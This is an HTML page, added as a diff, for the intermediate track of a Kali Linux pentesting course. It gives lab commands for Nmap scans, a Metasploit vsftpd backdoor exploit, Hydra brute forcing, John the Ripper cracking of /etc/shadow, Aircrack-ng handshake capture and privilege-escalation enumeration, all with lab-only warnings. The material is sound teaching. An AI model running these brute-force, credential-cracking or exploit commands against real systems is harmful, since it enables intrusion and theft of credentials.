@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Intermediate Track — Kali Linux Learning Hub</title>
+<meta name="description" content="Go deeper with Nmap, Metasploit, Burp Suite, Hydra, John the Ripper, wireless attacks and privilege escalation basics.">
+<link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<header class="site-header">
+  <div class="nav-titlebar">
+    <div class="wrap" style="display:flex;align-items:center;gap:10px;">
+      <div class="term-dots"><span></span><span></span><span></span></div>
+      <div class="term-path"><span class="caret">➜</span> kali-learning-hub git:(main) root@kali:~/intermediate#</div>
+    </div>
+  </div>
+  <nav class="navbar wrap">
+    <a href="../index.html" class="brand">
+      <svg class="brand-mark" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="2" y="2" width="60" height="60" rx="14" fill="#121822" stroke="#263140" stroke-width="2"/><path d="M18 21 L30 32 L18 43" fill="none" stroke="#2bd9c9" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="34" y1="43" x2="47" y2="43" stroke="#9c8cf5" stroke-width="4.5" stroke-linecap="round"/></svg>
+      <span class="brand-name">kali<span class="dim">@</span>learning-hub</span>
+    </a>
+    <div class="nav-links" id="navLinks">
+      <a href="../index.html">~/home</a>
+      <a href="../beginner/index.html">~/beginner</a>
+      <a href="../intermediate/index.html" class="active" aria-current="page">~/intermediate</a>
+      <a href="../advanced/index.html">~/advanced</a>
+      <a href="../projects/index.html">~/projects</a>
+      <a href="../resources/index.html">~/resources</a>
+    </div>
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="navLinks">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+  </nav>
+</header>
+
+<main style="--level-accent: var(--accent-amber);">
+
+  <section class="level-hero">
+    <div class="wrap">
+      <div class="level-hero-top">
+        <span class="badge badge-intermediate">Intermediate Track</span>
+        <a href="../projects/index.html" class="btn btn-outline btn-sm">Jump to intermediate projects →</a>
+      </div>
+      <h1>The core toolset every pentester relies on.</h1>
+      <p>You're comfortable in the terminal and you understand the legal boundaries. Now it's time to go deep on the tools that make up 80% of real-world assessments: Nmap, Metasploit, Burp Suite, Hydra, and John the Ripper — plus an introduction to wireless attacks and privilege escalation.</p>
+      <div class="level-meta">
+        <div><b>07</b>modules</div>
+        <div><b>03</b>paired projects</div>
+        <div><b>~10–14h</b>self-paced</div>
+        <div><b>Beginner track</b>recommended first</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="wrap level-layout">
+    <aside class="toc">
+      <div class="toc-label">On this page</div>
+      <ol>
+        <li><a href="#nmap-deep-dive">Nmap deep dive</a></li>
+        <li><a href="#metasploit-basics">Metasploit basics</a></li>
+        <li><a href="#burp-suite">Burp Suite basics</a></li>
+        <li><a href="#hydra">Hydra password attacks</a></li>
+        <li><a href="#john">John the Ripper</a></li>
+        <li><a href="#wireless">Wireless attacks overview</a></li>
+        <li><a href="#privesc-basics">Privilege escalation basics</a></li>
+      </ol>
+      <div class="toc-label" style="margin-top:22px;">Paired projects</div>
+      <ol style="counter-reset: none;">
+        <li style="list-style:none;"><a href="../projects/index.html#burp-exploitation" style="padding-left:10px;">Burp Suite exploitation</a></li>
+        <li style="list-style:none;"><a href="../projects/index.html#hydra-brute-force" style="padding-left:10px;">Hydra brute force</a></li>
+        <li style="list-style:none;"><a href="../projects/index.html#metasploit-exploitation" style="padding-left:10px;">Metasploit exploitation</a></li>
+      </ol>
+    </aside>
+
+    <div class="modules">
+
+      <!-- MODULE 1 -->
+      <article class="module term-window" id="nmap-deep-dive">
+        <div class="module-head"><span class="idx">01</span><h2>Nmap deep dive</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Nmap ("Network Mapper") is the tool nearly every engagement starts with. It answers three questions about a target: which hosts are alive, which ports are open, and what's running on them. The beginner track covered a basic scan — here you'll learn the flags that make Nmap genuinely useful.</p>
+
+          <h4>Scan types</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> sudo nmap <span class="c-flag">-sS</span> 10.0.10.20        <span class="c-comment"># SYN ("half-open") scan — fast, stealthier, needs root</span>
+<span class="c-prompt">$</span> nmap <span class="c-flag">-sT</span> 10.0.10.20             <span class="c-comment"># full TCP connect scan — no root required</span>
+<span class="c-prompt">$</span> sudo nmap <span class="c-flag">-sU</span> 10.0.10.20        <span class="c-comment"># UDP scan — slower, catches DNS/SNMP/etc.</span>
+<span class="c-prompt">$</span> nmap <span class="c-flag">-sV</span> 10.0.10.20             <span class="c-comment"># probe open ports for service/version info</span>
+<span class="c-prompt">$</span> sudo nmap <span class="c-flag">-O</span> 10.0.10.20         <span class="c-comment"># attempt OS fingerprinting</span></code></pre>
+          </div>
+
+          <h4>A practical all-in-one scan</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> sudo nmap <span class="c-flag">-A -T4 -p-</span> -oN full-scan.txt 10.0.10.20</code></pre>
+          </div>
+          <ul>
+            <li><code>-A</code> enables OS detection, version detection, script scanning, and traceroute</li>
+            <li><code>-T4</code> sets an "aggressive" timing template — faster, still generally safe on a stable lab network</li>
+            <li><code>-p-</code> scans all 65,535 ports instead of the default top 1000</li>
+            <li><code>-oN full-scan.txt</code> saves readable output to a file for your notes</li>
+          </ul>
+
+          <h4>Nmap Scripting Engine (NSE)</h4>
+          <ul>
+            <li><code>--script=default</code> runs a safe, general-purpose script set alongside the scan</li>
+            <li><code>--script=vuln</code> checks for known vulnerabilities matching detected service versions</li>
+            <li><code>--script=http-title,http-headers</code> runs specific named scripts</li>
+          </ul>
+
+          <div class="callout callout-caution">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4M12 16.5h.01M10.3 3.9 2.6 18a2 2 0 0 0 1.8 3h15.2a2 2 0 0 0 1.8-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg>
+            <p><strong>Loud scans get noticed</strong><code>-A -T4 -p-</code> is comprehensive but noisy — it will trip IDS/IPS alerts on any monitored network. Only run it against your own lab targets, and use gentler timing (<code>-T2</code>) when stealth actually matters for a legitimate authorized engagement.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 2 -->
+      <article class="module term-window" id="metasploit-basics">
+        <div class="module-head"><span class="idx">02</span><h2>Metasploit basics</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>The Metasploit Framework is a library of known exploits, payloads, and auxiliary modules wrapped in a consistent interface (<code>msfconsole</code>), so you don't need custom code for every publicly known vulnerability. It's the single most-used exploitation framework in the industry.</p>
+
+          <h4>Framework building blocks</h4>
+          <ul>
+            <li><strong>Exploit</strong> — code that takes advantage of a specific vulnerability</li>
+            <li><strong>Payload</strong> — the code that runs once the exploit succeeds (e.g. a reverse shell)</li>
+            <li><strong>Auxiliary</strong> — modules for scanning, fuzzing, and other non-exploit tasks</li>
+            <li><strong>Encoder / NOP generator</strong> — helpers used mainly in evasion and exploit-dev work</li>
+          </ul>
+
+          <h4>A standard workflow against a lab target</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>msfconsole</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">msf6 &gt;</span> search type:exploit vsftpd
+<span class="c-prompt">msf6 &gt;</span> use exploit/unix/ftp/vsftpd_234_backdoor
+<span class="c-prompt">msf6 &gt;</span> show options
+<span class="c-prompt">msf6 &gt;</span> set RHOSTS 10.0.10.20
+<span class="c-prompt">msf6 &gt;</span> set LHOST 10.0.10.10
+<span class="c-prompt">msf6 &gt;</span> run</code></pre>
+          </div>
+          <p>That specific module targets an intentionally backdoored FTP service shipped in the Metasploitable practice VM — it's a textbook first exploit precisely because the target was built for learning.</p>
+
+          <h4>Payload generation with msfvenom</h4>
+          <ul>
+            <li><code>msfvenom -l payloads</code> lists available payloads</li>
+            <li>Payloads are typically named by target + connection style, e.g. <code>windows/x64/meterpreter/reverse_tcp</code></li>
+            <li>You'll build a payload hands-on in the Advanced track's custom payload module</li>
+          </ul>
+
+          <div class="callout callout-legal">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 2 20h20L12 2z"/><line x1="12" y1="9" x2="12" y2="14"/><circle cx="12" cy="17.2" r="0.6" fill="currentColor" stroke="none"/></svg>
+            <p><strong>Real exploits, lab only</strong>Metasploit modules are functioning exploits for real (usually patched) vulnerabilities. Run them only against VMs you built for this purpose — Metasploitable, DVWA, or a purpose-built VulnHub/HTB box.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 3 -->
+      <article class="module term-window" id="burp-suite">
+        <div class="module-head"><span class="idx">03</span><h2>Burp Suite basics</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Burp Suite is an intercepting proxy — it sits between your browser and the web application, letting you see and edit every request before it's sent. It's the primary tool for manual web application testing, complementing automated scanners like Nmap's HTTP scripts.</p>
+
+          <h4>Setting up the proxy</h4>
+          <ul>
+            <li>Launch Burp Suite (Community Edition ships with Kali) and confirm the proxy listener is on <code>127.0.0.1:8080</code></li>
+            <li>Point your browser's proxy settings at that address, or use a proxy-switcher extension like FoxyProxy</li>
+            <li>Visit <code>http://burp</code> in the proxied browser to download and install Burp's CA certificate, so HTTPS traffic can be inspected too</li>
+          </ul>
+
+          <h4>The tabs you'll use constantly</h4>
+          <ul>
+            <li><strong>Proxy → Intercept</strong> — pause a request before it reaches the server so you can view or edit it</li>
+            <li><strong>Repeater</strong> — resend a modified request as many times as you want, tweaking parameters each time</li>
+            <li><strong>Intruder</strong> — automate sending many variations of a request (rate-limited in Community Edition), useful for testing input handling</li>
+            <li><strong>Target</strong> — define scope so you only capture traffic to the application you're actually testing</li>
+          </ul>
+
+          <h4>A typical intercepted request</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>http</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code>POST /login.php HTTP/1.1
+Host: 10.0.10.20
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=admin&password=test</code></pre>
+          </div>
+          <p>Once you can see a request like this, you can change the <code>username</code> or <code>password</code> value and forward it, or send it to Repeater to try different inputs without re-submitting the form each time.</p>
+
+          <div class="callout callout-caution">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4M12 16.5h.01M10.3 3.9 2.6 18a2 2 0 0 0 1.8 3h15.2a2 2 0 0 0 1.8-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg>
+            <p><strong>Set scope carefully</strong>Always confirm Burp's scope is limited to your own lab app (DVWA, Juice Shop) before intercepting. Proxying and modifying traffic to any other site — even accidentally — can cross the same legal line covered in the beginner track.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 4 -->
+      <article class="module term-window" id="hydra">
+        <div class="module-head"><span class="idx">04</span><h2>Hydra password attacks</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Hydra is an online brute-force tool — it tries username/password combinations directly against a live login service (SSH, FTP, a web login form, etc.) rather than against a stolen hash. It's fast to learn and a good introduction to why weak, reused passwords are still the top real-world entry point.</p>
+
+          <h4>Basic syntax</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> hydra <span class="c-flag">-l</span> admin <span class="c-flag">-P</span> /usr/share/wordlists/rockyou.txt ssh://10.0.10.20
+<span class="c-prompt">$</span> hydra <span class="c-flag">-L</span> users.txt <span class="c-flag">-P</span> passwords.txt ftp://10.0.10.20
+<span class="c-prompt">$</span> hydra <span class="c-flag">-l</span> admin <span class="c-flag">-P</span> rockyou.txt 10.0.10.20 http-post-form <span class="c-str">"/login.php:username=^USER^&password=^PASS^:Invalid"</span></code></pre>
+          </div>
+          <ul>
+            <li><code>-l</code> a single username, <code>-L</code> a file of usernames</li>
+            <li><code>-P</code> a wordlist of passwords to try; <code>rockyou.txt</code> is a well-known list bundled with Kali under <code>/usr/share/wordlists/</code></li>
+            <li>The last argument is the protocol and target — <code>ssh://</code>, <code>ftp://</code>, <code>rdp://</code>, or <code>http-post-form</code> with a template describing the login form</li>
+          </ul>
+
+          <div class="callout callout-caution">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4M12 16.5h.01M10.3 3.9 2.6 18a2 2 0 0 0 1.8 3h15.2a2 2 0 0 0 1.8-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg>
+            <p><strong>Loud and disruptive by design</strong>Brute forcing generates huge volumes of failed logins, can lock real accounts, and is one of the easiest attacks to detect. Practice against a login you configured yourself, with a deliberately weak password, on an isolated target.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 5 -->
+      <article class="module term-window" id="john">
+        <div class="module-head"><span class="idx">05</span><h2>John the Ripper</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Where Hydra attacks a live login, John the Ripper cracks password <em>hashes</em> you already have — for example, from a file you were authorized to extract during a lab exercise. This is "offline" cracking: no more login attempts hit the target, so it's limited only by your own hardware.</p>
+
+          <h4>A typical workflow</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> unshadow passwd.txt shadow.txt &gt; combined.txt
+<span class="c-prompt">$</span> john <span class="c-flag">--wordlist=</span>/usr/share/wordlists/rockyou.txt combined.txt
+<span class="c-prompt">$</span> john <span class="c-flag">--show</span> combined.txt</code></pre>
+          </div>
+          <ul>
+            <li><code>unshadow</code> merges Linux's <code>/etc/passwd</code> and <code>/etc/shadow</code> into one file John can read</li>
+            <li><code>--wordlist</code> runs a dictionary attack; omit it and John defaults to a slower rule-based mode</li>
+            <li><code>--show</code> prints any hashes John has already cracked from its session file</li>
+          </ul>
+
+          <h4>Recognizing hash types</h4>
+          <ul>
+            <li><code>john --list=formats</code> shows every hash format John understands</li>
+            <li>Common formats you'll encounter: MD5, SHA-256, NTLM (Windows), and bcrypt</li>
+            <li>Hashcat (also included in Kali) is John's GPU-accelerated cousin — worth learning once you're comfortable here</li>
+          </ul>
+        </div>
+      </article>
+
+      <!-- MODULE 6 -->
+      <article class="module term-window" id="wireless">
+        <div class="module-head"><span class="idx">06</span><h2>Wireless attacks overview</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Wireless testing works differently from wired network attacks — you need a wireless adapter that supports "monitor mode" (most laptop built-in cards and many VM USB passthroughs don't), and you can only legally test networks you own or have written authorization for, since wireless attacks affect real radio spectrum, not just a target machine.</p>
+
+          <h4>The Aircrack-ng suite</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> sudo airmon-ng start wlan0        <span class="c-comment"># switch the adapter into monitor mode</span>
+<span class="c-prompt">$</span> sudo airodump-ng wlan0mon         <span class="c-comment"># list nearby networks and connected clients</span>
+<span class="c-prompt">$</span> sudo airodump-ng <span class="c-flag">-c</span> 6 <span class="c-flag">--bssid</span> AA:BB:CC:DD:EE:FF <span class="c-flag">-w</span> capture wlan0mon</code></pre>
+          </div>
+          <ul>
+            <li><strong>airmon-ng</strong> — enables/disables monitor mode on your wireless adapter</li>
+            <li><strong>airodump-ng</strong> — passively captures beacon frames and, for WPA/WPA2, the four-way authentication handshake</li>
+            <li><strong>aireplay-ng</strong> — can send deauthentication frames to a client to speed up handshake capture on a network you control</li>
+            <li><strong>aircrack-ng</strong> — attempts to recover the passphrase from a captured handshake using a wordlist, the same dictionary-attack idea as Hydra and John</li>
+          </ul>
+
+          <div class="callout callout-legal">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 2 20h20L12 2z"/><line x1="12" y1="9" x2="12" y2="14"/><circle cx="12" cy="17.2" r="0.6" fill="currentColor" stroke="none"/></svg>
+            <p><strong>Your own router, nothing else</strong>Deauthenticating clients and capturing handshakes on a network you don't own is illegal essentially everywhere and affects everyone connected to it, not just you. Practice on a spare router or a dedicated wireless testing lab you built and own.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- MODULE 7 -->
+      <article class="module term-window" id="privesc-basics">
+        <div class="module-head"><span class="idx">07</span><h2>Privilege escalation basics</h2></div>
+        <div class="divider"></div>
+        <div class="module-body">
+          <p>Gaining initial access rarely means gaining full control. Privilege escalation is the process of turning a low-privilege foothold (a regular user shell) into administrator or root access — and it's usually the difference between "found a bug" and "fully compromised the box."</p>
+
+          <h4>Linux enumeration commands</h4>
+          <div class="code-block">
+            <div class="cb-head"><span>bash</span><button class="copy-btn" data-label="Copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>Copy</button></div>
+            <pre><code><span class="c-prompt">$</span> sudo -l                                   <span class="c-comment"># what can this user run as root?</span>
+<span class="c-prompt">$</span> find / -perm -4000 -type f 2&gt;/dev/null    <span class="c-comment"># SUID binaries — sometimes exploitable</span>
+<span class="c-prompt">$</span> uname -a                                  <span class="c-comment"># kernel version — check for known privesc CVEs</span>
+<span class="c-prompt">$</span> crontab -l                                <span class="c-comment"># scheduled jobs that might run as root</span></code></pre>
+          </div>
+
+          <h4>What you're looking for</h4>
+          <ul>
+            <li>Misconfigured <code>sudo</code> permissions that let a low-privilege user run something powerful as root</li>
+            <li>SUID binaries that can be abused to spawn a root shell (GTFOBins is the standard reference for which ones)</li>
+            <li>Outdated kernels vulnerable to a known local-privilege-escalation exploit</li>
+            <li>Cron jobs or services running as root that a regular user can modify</li>
+          </ul>
+
+          <h4>On Windows targets</h4>
+          <ul>
+            <li><code>whoami /priv</code> — lists the current user's privileges</li>
+            <li><code>systeminfo</code> — patch level and OS build, useful for matching known exploits</li>
+            <li>Automated enumeration scripts like LinPEAS (Linux) and WinPEAS (Windows) are commonly used to speed this process up — you'll use one in the Advanced post-exploitation module</li>
+          </ul>
+        </div>
+      </article>
+
+    </div>
+  </div>
+
+  <!-- ============ PAIRED PROJECTS ============ -->
+  <section class="tight">
+    <div class="wrap">
+      <div class="eyebrow">ls ~/projects --level=intermediate</div>
+      <h2 class="section-title">Put it into practice</h2>
+      <p class="section-lede" style="margin-bottom:30px;">Three guided projects that combine the tools from this track.</p>
+      <div class="grid-3">
+        <article class="project-card term-window">
+          <div class="term-titlebar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-path">~/projects/burp-exploitation</div></div>
+          <div class="project-card-body">
+            <span class="badge badge-intermediate">Intermediate</span>
+            <h3>Burp Suite exploitation</h3>
+            <p>Use Burp Suite to find and exploit a broken access control bug in DVWA.</p>
+            <a href="../projects/index.html#burp-exploitation" class="btn btn-outline btn-sm">View project →</a>
+          </div>
+        </article>
+        <article class="project-card term-window">
+          <div class="term-titlebar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-path">~/projects/hydra-brute-force</div></div>
+          <div class="project-card-body">
+            <span class="badge badge-intermediate">Intermediate</span>
+            <h3>Hydra brute force</h3>
+            <p>Configure a deliberately weak SSH login and crack it with Hydra and rockyou.txt.</p>
+            <a href="../projects/index.html#hydra-brute-force" class="btn btn-outline btn-sm">View project →</a>
+          </div>
+        </article>
+        <article class="project-card term-window">
+          <div class="term-titlebar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-path">~/projects/metasploit-exploitation</div></div>
+          <div class="project-card-body">
+            <span class="badge badge-intermediate">Intermediate</span>
+            <h3>Metasploit exploitation</h3>
+            <p>Use msfconsole to exploit a known backdoor on Metasploitable and land a shell.</p>
+            <a href="../projects/index.html#metasploit-exploitation" class="btn btn-outline btn-sm">View project →</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="tight">
+    <div class="wrap" style="text-align:center;">
+      <p style="color:var(--text-dim); font-family:var(--font-mono); font-size:13px; margin-bottom:16px;">root@kali:~/intermediate# cd ../advanced</p>
+      <a href="../advanced/index.html" class="btn btn-primary">Continue to Advanced track →</a>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-col footer-brand">
+        <a href="../index.html" class="brand" style="margin-bottom:12px; display:inline-flex;">
+          <svg class="brand-mark" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="2" y="2" width="60" height="60" rx="14" fill="#121822" stroke="#263140" stroke-width="2"/><path d="M18 21 L30 32 L18 43" fill="none" stroke="#2bd9c9" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="34" y1="43" x2="47" y2="43" stroke="#9c8cf5" stroke-width="4.5" stroke-linecap="round"/></svg>
+          <span class="brand-name">kali<span class="dim">@</span>learning-hub</span>
+        </a>
+        <p>A free, independent Kali Linux curriculum for learning ethical hacking safely and legally. Not affiliated with or endorsed by Offensive Security.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Learn</h4>
+        <ul>
+          <li><a href="../beginner/index.html">Beginner track</a></li>
+          <li><a href="../intermediate/index.html">Intermediate track</a></li>
+          <li><a href="../advanced/index.html">Advanced track</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Explore</h4>
+        <ul>
+          <li><a href="../projects/index.html">All projects</a></li>
+          <li><a href="../resources/index.html">Cheat sheets</a></li>
+          <li><a href="../resources/index.html#legal">Legal guidelines</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Official docs</h4>
+        <ul>
+          <li><a href="https://www.kali.org/docs/" target="_blank" rel="noopener">Kali Linux docs</a></li>
+          <li><a href="https://nmap.org/book/" target="_blank" rel="noopener">Nmap reference guide</a></li>
+          <li><a href="https://owasp.org/" target="_blank" rel="noopener">OWASP</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>root@kali:~/intermediate# exit</p>
+      <p>© 2026 Kali Linux Learning Hub · Educational content only · For authorized lab use</p>
+    </div>
+  </div>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
